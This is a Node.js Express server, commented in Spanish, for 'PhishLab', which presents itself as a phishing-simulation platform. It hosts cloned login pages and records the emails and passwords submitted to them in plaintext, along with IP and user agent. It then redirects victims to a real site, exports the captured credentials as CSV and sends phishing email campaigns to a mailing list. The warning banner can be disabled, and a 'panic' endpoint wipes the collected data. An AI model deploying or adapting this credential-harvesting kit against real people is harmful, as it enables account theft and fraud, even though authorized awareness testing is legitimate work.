'use strict';

const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const express = require('express');
const session = require('express-session');
const multer = require('multer');

const env = require('./lib/env');
const store = require('./lib/store');
const auth = require('./lib/auth');
const mailer = require('./lib/mailer');
const tpl = require('./lib/templates');

// --- Arranque: asegurar admin por defecto ---
auth.ensureAdminExists();

const app = express();

if (env.TRUST_PROXY) {
  app.set('trust proxy', 1);
}

app.disable('x-powered-by');

// --- Sesion ---
const sessionSecret = env.SESSION_SECRET || store.get().meta.sessionSecret;
app.use(session({
  name: 'pl.sid',
  secret: sessionSecret,
  resave: false,
  saveUninitialized: false,
  rolling: true,
  cookie: {
    httpOnly: true,
    sameSite: 'lax',
    secure: 'auto',
    maxAge: env.SESSION_TTL
  }
}));

// --- Body parsing ---
app.use(express.json({ limit: '2mb' }));
app.use(express.urlencoded({ extended: true, limit: '2mb' }));

// --- CSRF (cookie de doble submit) ---
app.use(auth.issueCsrf);

// --- Log de peticiones API (compacto) ---
app.use((req, res, next) => {
  if (req.path.startsWith('/api/') && !req.path.startsWith('/api/capture/')) {
    console.log('[api] ' + req.method + ' ' + req.path + ' (user=' + (req.session && req.session.userId || 'anon') + ')');
  }
  next();
});

// --- Estaticos ---
app.use(express.static(path.join(__dirname, 'public')));
app.use('/uploads', (req, res, next) => {
  const ok = /\.(png|jpe?g|gif|webp|svg)$/i.test(req.path);
  if (!ok) return res.status(404).json({ error: 'Tipo de archivo no permitido' });
  next();
}, express.static(path.join(env.DATA_DIR, 'uploads')));

// --- Utilidades ---
function clientIp(req) {
  return req.headers['x-forwarded-for'] ? String(req.headers['x-forwarded-for']).split(',')[0].trim() : (req.socket && req.socket.remoteAddress || '');
}

function baseUrl(req) {
  if (env.APP_URL) return env.APP_URL.replace(/\/+$/, '');
  return req.protocol + '://' + req.get('host');
}

function badRequest(res, msg) {
  return res.status(400).json({ error: msg });
}

// ============================================================
//  Publico
// ============================================================

app.get('/ping', (req, res) => res.json({ ok: true, ts: Date.now() }));

app.get('/', (req, res) => res.redirect('/admin.html'));

app.get('/api/public-config', (req, res) => {
  const s = store.get().settings;
  res.json({ appName: s.appName, theme: s.theme, simBanner: s.simBanner });
});

// --- Pagina de captura publica ---
app.get('/p/:slug', (req, res) => {
  const page = store.findBy('pages', 'slug', String(req.params.slug).toLowerCase());
  if (!page) return res.status(404).send('404 - Pagina no encontrada');
  const captureUrl = '/api/capture/' + page.id;
  let html = tpl.buildCaptureHtml(page).split('##CAPTURE##').join(captureUrl);
  const s = store.get().settings;
  if (s.simBanner) {
    const banner = '<div style="background:#fff3cd;color:#664d03;border-bottom:1px solid #ffc107;padding:8px 16px;text-align:center;font-family:Arial,sans-serif;font-size:13px">SIMULACION DE PHISHING - Entorno de pruebas autorizado</div>';
    html = banner + html;
  }
  res.set('X-Robots-Tag', 'noindex, nofollow');
  res.type('html').send(html);
});

// --- Captura de credenciales (publica, sin CSRF) ---
app.post('/api/capture/:id', (req, res) => {
  const page = store.findBy('pages', 'id', String(req.params.id));
  if (!page) return res.status(404).json({ error: 'Pagina no encontrada' });
  const b = req.body || {};
  const pick = (aliases) => {
    for (const a of aliases) {
      if (b[a] !== undefined && b[a] !== null && String(b[a]).trim() !== '') return String(b[a]);
    }
    return '';
  };
  const email = pick(['email', 'username', 'user', 'login']);
  const password = pick(['password', 'pass', 'passwd']);
  if (email && password) {
    store.insert('captures', {
      pageId: page.id,
      pageName: page.name,
      email,
      password,
      ip: clientIp(req),
      userAgent: (req.get('user-agent') || '').slice(0, 300)
    });
  }
  const redirectTo = page.redirectUrl || store.get().settings.defaultRedirect || 'https://accounts.google.com';
  return res.redirect(302, redirectTo);
});

// ============================================================
//  Auth
// ============================================================

app.post('/api/auth/login', (req, res) => {
  const ip = clientIp(req);
  if (!auth.checkLoginRateLimit(ip)) {
    return res.status(429).json({ error: 'Demasiados intentos. Espera 15 minutos.' });
  }
  const { username, password } = req.body || {};
  if (!username || !password) return badRequest(res, 'Usuario y contrasena obligatorios');
  const user = store.findBy('users', 'username', String(username).trim());
  if (!user || !auth.verifyPassword(password, user.passwordHash)) {
    auth.recordLoginFailure(ip);
    return res.status(401).json({ error: 'Credenciales incorrectas' });
  }
  auth.clearLoginAttempts(ip);
  req.session.userId = user.id;
  req.session.role = user.role;
  res.json({ user: auth.sanitizeUser(user), csrf: req.session.csrf });
});

app.post('/api/auth/logout', auth.requireAuth, (req, res) => {
  req.session.destroy(() => {
    res.clearCookie('pl.sid');
    res.json({ ok: true });
  });
});

app.get('/api/auth/me', auth.requireAuth, (req, res) => {
  res.json({ user: auth.sanitizeUser(req.user), csrf: req.session.csrf });
});

app.put('/api/auth/password', auth.requireAuth, (req, res) => {
  const { current, next } = req.body || {};
  if (!auth.verifyPassword(current || '', req.user.passwordHash)) {
    return res.status(400).json({ error: 'La contrasena actual no es correcta' });
  }
  if (!next || String(next).length < 6) {
    return res.status(400).json({ error: 'La nueva contrasena debe tener al menos 6 caracteres' });
  }
  store.update('users', req.user.id, { passwordHash: auth.hashPassword(next) });
  res.json({ ok: true });
});

// ============================================================
//  Usuarios (solo admin)
// ============================================================

app.get('/api/users', auth.requireAuth, auth.requireRole('admin'), (req, res) => {
  res.json({ users: store.get().users.map(auth.sanitizeUser) });
});

app.post('/api/users', auth.requireAuth, auth.requireRole('admin'), (req, res) => {
  const { username, password, role } = req.body || {};
  if (!username || !password) return badRequest(res, 'Usuario y contrasena obligatorios');
  if (String(password).length < 6) return badRequest(res, 'La contrasena debe tener al menos 6 caracteres');
  if (!['admin', 'visitor'].includes(role)) return badRequest(res, 'Rol invalido');
  const name = String(username).trim();
  if (store.findBy('users', 'username', name)) return badRequest(res, 'Ese nombre de usuario ya existe');
  const u = store.insert('users', {
    username: name,
    passwordHash: auth.hashPassword(password),
    role
  });
  res.status(201).json({ user: auth.sanitizeUser(u) });
});

app.put('/api/users/:id', auth.requireAuth, auth.requireRole('admin'), (req, res) => {
  const target = store.findBy('users', 'id', String(req.params.id));
  if (!target) return res.status(404).json({ error: 'Usuario no encontrado' });
  const { role, password } = req.body || {};
  const patch = {};
  if (role !== undefined) {
    if (!['admin', 'visitor'].includes(role)) return badRequest(res, 'Rol invalido');
    if (target.role === 'admin' && role !== 'admin') {
      const admins = store.where('users', (u) => u.role === 'admin');
      if (admins.length <= 1) return badRequest(res, 'No puedes quitar el rol admin al ultimo administrador');
    }
    patch.role = role;
  }
  if (password !== undefined && password !== '') {
    if (String(password).length < 6) return badRequest(res, 'La contrasena debe tener al menos 6 caracteres');
    patch.passwordHash = auth.hashPassword(password);
  }
  const updated = store.update('users', target.id, patch);
  res.json({ user: auth.sanitizeUser(updated) });
});

app.delete('/api/users/:id', auth.requireAuth, auth.requireRole('admin'), (req, res) => {
  const target = store.findBy('users', 'id', String(req.params.id));
  if (!target) return res.status(404).json({ error: 'Usuario no encontrado' });
  if (target.role === 'admin') {
    const admins = store.where('users', (u) => u.role === 'admin');
    if (admins.length <= 1) return badRequest(res, 'No puedes borrar al ultimo administrador');
  }
  store.remove('users', target.id);
  res.json({ ok: true });
});

// ============================================================
//  Ajustes
// ============================================================

app.get('/api/settings', auth.requireAuth, (req, res) => {
  const s = store.get().settings;
  res.json({
    settings: {
      appName: s.appName,
      theme: s.theme,
      simBanner: s.simBanner,
      defaultRedirect: s.defaultRedirect,
      smtpConfigured: mailer.configured()
    }
  });
});

app.put('/api/settings', auth.requireAuth, auth.requireRole('admin'), (req, res) => {
  const b = req.body || {};
  const s = store.get().settings;
  const patch = {};
  if (b.appName !== undefined) {
    const name = String(b.appName).trim().slice(0, 60);
    if (!name) return badRequest(res, 'Nombre de aplicacion vacio');
    patch.appName = name;
  }
  if (b.theme !== undefined) {
    if (!['claro', 'oscuro', 'medianoche', 'oled'].includes(b.theme)) return badRequest(res, 'Tema invalido');
    patch.theme = b.theme;
  }
  if (b.simBanner !== undefined) patch.simBanner = Boolean(b.simBanner);
  if (b.defaultRedirect !== undefined) {
    const url = String(b.defaultRedirect).trim();
    if (!/^https?:\/\//i.test(url)) return badRequest(res, 'La URL de redireccion debe empezar por http(s)://');
    patch.defaultRedirect = url;
  }
  const updated = store.update('settings', 'settings', patch);
  res.json({ settings: updated });
});

// ============================================================
//  Plantillas
// ============================================================

app.get('/api/templates', auth.requireAuth, (req, res) => {
  res.json({ templates: tpl.listTemplates() });
});

app.get('/api/templates/:id', auth.requireAuth, (req, res) => {
  const t = tpl.getBuiltinTemplate(String(req.params.id));
  if (!t) return res.status(404).json({ error: 'Plantilla no encontrada' });
  res.json(t);
});

// ============================================================
//  Paginas de phishing
// ============================================================

app.get('/api/pages', auth.requireAuth, (req, res) => {
  res.json({ pages: store.get().pages });
});

app.post('/api/pages', auth.requireAuth, auth.requireRole('admin'), (req, res) => {
  const { name, html, templateId, redirectUrl } = req.body || {};
  if (!name) return badRequest(res, 'El nombre es obligatorio');
  if (!html || String(html).length < 10) return badRequest(res, 'El HTML es demasiado corto');
  const page = store.insert('pages', {
    name: String(name).trim(),
    slug: tpl.uniqueSlug(name),
    html: String(html),
    templateId: templateId || '',
    redirectUrl: (redirectUrl || '').trim() || store.get().settings.defaultRedirect,
    updatedAt: new Date().toISOString()
  });
  res.status(201).json({ page });
});

app.get('/api/pages/:id', auth.requireAuth, (req, res) => {
  const page = store.findBy('pages', 'id', String(req.params.id));
  if (!page) return res.status(404).json({ error: 'Pagina no encontrada' });
  res.json({ page });
});

app.put('/api/pages/:id', auth.requireAuth, auth.requireRole('admin'), (req, res) => {
  const page = store.findBy('pages', 'id', String(req.params.id));
  if (!page) return res.status(404).json({ error: 'Pagina no encontrada' });
  const { name, html, redirectUrl } = req.body || {};
  const patch = {};
  if (name !== undefined) {
    if (!String(name).trim()) return badRequest(res, 'El nombre es obligatorio');
    patch.name = String(name).trim();
  }
  if (html !== undefined) {
    if (String(html).length < 10) return badRequest(res, 'El HTML es demasiado corto');
    patch.html = String(html);
  }
  if (redirectUrl !== undefined) {
    const url = String(redirectUrl).trim();
    if (url && !/^https?:\/\//i.test(url)) return badRequest(res, 'La URL de redireccion debe empezar por http(s)://');
    patch.redirectUrl = url || store.get().settings.defaultRedirect;
  }
  patch.updatedAt = new Date().toISOString();
  const updated = store.update('pages', page.id, patch);
  res.json({ page: updated });
});

app.delete('/api/pages/:id', auth.requireAuth, auth.requireRole('admin'), (req, res) => {
  store.remove('pages', String(req.params.id));
  res.json({ ok: true });
});

// ============================================================
//  Capturas
// ============================================================

app.get('/api/captures', auth.requireAuth, auth.requireAnyRole(['admin', 'visitor']), (req, res) => {
  const list = store.get().captures.slice().reverse();
  res.json({ captures: list });
});

app.delete('/api/captures', auth.requireAuth, auth.requireRole('admin'), (req, res) => {
  store.get().captures = [];
  store.save();
  res.json({ ok: true });
});

app.get('/api/captures/export', auth.requireAuth, auth.requireAnyRole(['admin', 'visitor']), (req, res) => {
  const list = store.get().captures;
  const esc = (v) => {
    const s = String(v === undefined || v === null ? '' : v);
    return '"' + s.replace(/"/g, '""') + '"';
  };
  const rows = [['fecha', 'pagina', 'email', 'password', 'ip', 'user_agent']];
  for (const c of list) {
    rows.push([c.createdAt, c.pageName, c.email, c.password, c.ip, c.userAgent].map(esc).join(','));
  }
  res.setHeader('Content-Type', 'text/csv; charset=utf-8');
  res.setHeader('Content-Disposition', 'attachment; filename="capturas-' + Date.now() + '.csv"');
  res.send('\uFEFF' + rows.join('\r\n'));
});

// ============================================================
//  Lista de correos (mailing)
// ============================================================

app.get('/api/mailing', auth.requireAuth, auth.requireAnyRole(['admin', 'visitor']), (req, res) => {
  res.json({ mailing: store.get().mailing });
});

app.post('/api/mailing', auth.requireAuth, auth.requireAnyRole(['admin', 'visitor']), (req, res) => {
  const { email, name } = req.body || {};
  const addr = String(email || '').trim().toLowerCase();
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(addr)) return badRequest(res, 'Email invalido');
  if (store.findBy('mailing', 'email', addr)) return badRequest(res, 'Ese email ya esta en la lista');
  const row = store.insert('mailing', { email: addr, name: String(name || '').trim().slice(0, 80) });
  res.status(201).json({ item: row });
});

app.put('/api/mailing/:id', auth.requireAuth, auth.requireRole('admin'), (req, res) => {
  const item = store.findBy('mailing', 'id', String(req.params.id));
  if (!item) return res.status(404).json({ error: 'No encontrado' });
  const { email, name } = req.body || {};
  const patch = {};
  if (email !== undefined) {
    const addr = String(email).trim().toLowerCase();
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(addr)) return badRequest(res, 'Email invalido');
    const dup = store.findBy('mailing', 'email', addr);
    if (dup && dup.id !== item.id) return badRequest(res, 'Ese email ya esta en la lista');
    patch.email = addr;
  }
  if (name !== undefined) patch.name = String(name).trim().slice(0, 80);
  res.json({ item: store.update('mailing', item.id, patch) });
});

app.delete('/api/mailing/:id', auth.requireAuth, auth.requireRole('admin'), (req, res) => {
  store.remove('mailing', String(req.params.id));
  res.json({ ok: true });
});

// ============================================================
//  Campanas de correo (emails)
// ============================================================

app.get('/api/emails', auth.requireAuth, auth.requireRole('admin'), (req, res) => {
  res.json({ emails: store.get().emails });
});

app.post('/api/emails', auth.requireAuth, auth.requireRole('admin'), (req, res) => {
  const { name, subject, html, templateId } = req.body || {};
  if (!name || !subject) return badRequest(res, 'Nombre y asunto obligatorios');
  if (!html || String(html).length < 10) return badRequest(res, 'El HTML es demasiado corto');
  const row = store.insert('emails', {
    name: String(name).trim(),
    subject: String(subject).trim().slice(0, 200),
    html: String(html),
    templateId: templateId || '',
    updatedAt: new Date().toISOString()
  });
  res.status(201).json({ email: row });
});

app.put('/api/emails/:id', auth.requireAuth, auth.requireRole('admin'), (req, res) => {
  const email = store.findBy('emails', 'id', String(req.params.id));
  if (!email) return res.status(404).json({ error: 'No encontrado' });
  const { name, subject, html } = req.body || {};
  const patch = {};
  if (name !== undefined) patch.name = String(name).trim();
  if (subject !== undefined) patch.subject = String(subject).trim().slice(0, 200);
  if (html !== undefined) patch.html = String(html);
  patch.updatedAt = new Date().toISOString();
  res.json({ email: store.update('emails', email.id, patch) });
});

app.delete('/api/emails/:id', auth.requireAuth, auth.requireRole('admin'), (req, res) => {
  store.remove('emails', String(req.params.id));
  res.json({ ok: true });
});

app.post('/api/emails/:id/send', auth.requireAuth, auth.requireRole('admin'), async (req, res) => {
  const email = store.findBy('emails', 'id', String(req.params.id));
  if (!email) return res.status(404).json({ error: 'No encontrado' });
  const { targets, pageId } = req.body || {};
  const mailing = store.get().mailing;
  let toSend = [];
  if (Array.isArray(targets) && targets.length) {
    toSend = targets.map((t) => String(t).trim().toLowerCase()).filter((t) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(t));
  } else {
    toSend = mailing.map((m) => m.email);
  }
  toSend = Array.from(new Set(toSend));
  if (!toSend.length) return badRequest(res, 'No hay destinatarios: lista de correos vacia o targets invalidos');

  const page = pageId ? store.findBy('pages', 'id', String(pageId)) : null;
  const pageUrl = page ? baseUrl(req) + '/p/' + page.slug : '';
  const appName = store.get().settings.appName;

  const results = [];
  for (const to of toSend) {
    const name = (mailing.find((m) => m.email === to) || {}).name || '';
    const html = tpl.renderEmail(email.html, {
      pageUrl,
      email: to,
      name,
      appName
    });
    try {
      const r = await mailer.sendEmail({ to, subject: email.subject, html });
      results.push({ to, status: r.simulated ? 'simulado' : 'ok', messageId: r.messageId });
      store.insert('mailLog', {
        emailId: email.id,
        emailName: email.name,
        to,
        subject: email.subject,
        status: r.simulated ? 'simulado' : 'ok',
        messageId: r.messageId || '',
        error: '',
        createdAt: new Date().toISOString()
      });
    } catch (err) {
      results.push({ to, status: 'error', error: err.message });
      store.insert('mailLog', {
        emailId: email.id,
        emailName: email.name,
        to,
        subject: email.subject,
        status: 'error',
        messageId: '',
        error: String(err.message).slice(0, 300),
        createdAt: new Date().toISOString()
      });
    }
  }
  res.json({ results, simulated: !mailer.configured() });
});

app.get('/api/mail-log', auth.requireAuth, auth.requireRole('admin'), (req, res) => {
  res.json({ log: store.get().mailLog.slice().reverse() });
});

// ============================================================
//  Subidas de imagenes (solo admin)
// ============================================================

const upload = multer({
  storage: multer.diskStorage({
    destination: path.join(env.DATA_DIR, 'uploads'),
    filename: (req, file, cb) => {
      const ext = path.extname(file.originalname || '').toLowerCase();
      cb(null, Date.now() + '-' + crypto.randomBytes(4).toString('hex') + ext);
    }
  }),
  limits: { fileSize: 5 * 1024 * 1024 },
  fileFilter: (req, file, cb) => {
    const ok = /\.(png|jpe?g|gif|webp|svg)$/i.test(file.originalname || '');
    cb(ok ? null : new Error('Solo se permiten imagenes'), ok);
  }
});

app.post('/api/uploads', auth.requireAuth, auth.requireRole('admin'), (req, res) => {
  upload.single('file')(req, res, (err) => {
    if (err) return badRequest(res, err.message || 'Error al subir');
    if (!req.file) return badRequest(res, 'Archivo no recibido');
    const row = store.insert('uploads', {
      filename: req.file.filename,
      originalName: String(req.file.originalname || '').slice(0, 120),
      size: req.file.size,
      mime: req.file.mimetype || '',
      url: '/uploads/' + req.file.filename
    });
    res.status(201).json({ upload: row });
  });
});

app.get('/api/uploads', auth.requireAuth, (req, res) => {
  res.json({ uploads: store.get().uploads.slice().reverse() });
});

app.delete('/api/uploads/:id', auth.requireAuth, auth.requireRole('admin'), (req, res) => {
  const up = store.findBy('uploads', 'id', String(req.params.id));
  if (!up) return res.status(404).json({ error: 'No encontrado' });
  try { fs.unlinkSync(path.join(env.DATA_DIR, 'uploads', up.filename)); } catch (e) { /* noop */ }
  store.remove('uploads', up.id);
  res.json({ ok: true });
});

// ============================================================
//  Estadisticas
// ============================================================

app.get('/api/stats', auth.requireAuth, auth.requireAnyRole(['admin', 'visitor']), (req, res) => {
  const d = store.get();
  res.json({
    pages: d.pages.length,
    captures: d.captures.length,
    emails: d.emails.length,
    mailing: d.mailing.length,
    sent: d.mailLog.filter((l) => l.status === 'ok').length
  });
});

// ============================================================
//  Panico y factory reset (solo admin)
// ============================================================

app.post('/api/panic', auth.requireAuth, auth.requireRole('admin'), (req, res) => {
  const { confirm } = req.body || {};
  if (confirm !== 'BORRAR') return badRequest(res, 'Confirmacion invalida. Envia confirm:"BORRAR"');
  store.clearTestData();
  // Borrar archivos subidos del disco
  const dir = path.join(env.DATA_DIR, 'uploads');
  try {
    for (const f of fs.readdirSync(dir)) fs.unlinkSync(path.join(dir, f));
  } catch (e) { /* noop */ }
  res.json({ ok: true, message: 'Datos de prueba eliminados. Usuarios y ajustes conservados.' });
});

app.post('/api/factory-reset', auth.requireAuth, auth.requireRole('admin'), (req, res) => {
  const { confirm } = req.body || {};
  if (confirm !== 'RESETEAR') return badRequest(res, 'Confirmacion invalida. Envia confirm:"RESETEAR"');
  store.resetAll();
  req.session.destroy(() => {
    res.clearCookie('pl.sid');
    res.json({ ok: true, message: 'Fabricacion restablecida. Vuelve a iniciar sesion con admin/admin.' });
  });
});

// ============================================================
//  Cierre de API: 404 JSON y manejo de errores
// ============================================================

app.use('/api', (req, res) => res.status(404).json({ error: 'Ruta no encontrada' }));

app.use((err, req, res, next) => {
  console.error('[error]', err.message);
  if (res.headersSent) return next(err);
  res.status(500).json({ error: 'Error interno del servidor' });
});

// ============================================================
//  Arranque
// ============================================================

app.listen(env.PORT, () => {
  console.log('');
  console.log('  PhishLab arrancado');
  console.log('  Panel:    http://localhost:' + env.PORT + '/admin.html');
  console.log('  Datos:    ' + store.DB_FILE);
  console.log('  SMTP:     ' + (mailer.configured() ? 'configurado (' + env.SMTP.HOST + ')' : 'NO configurado (envio simulado)'));
  console.log('');
});
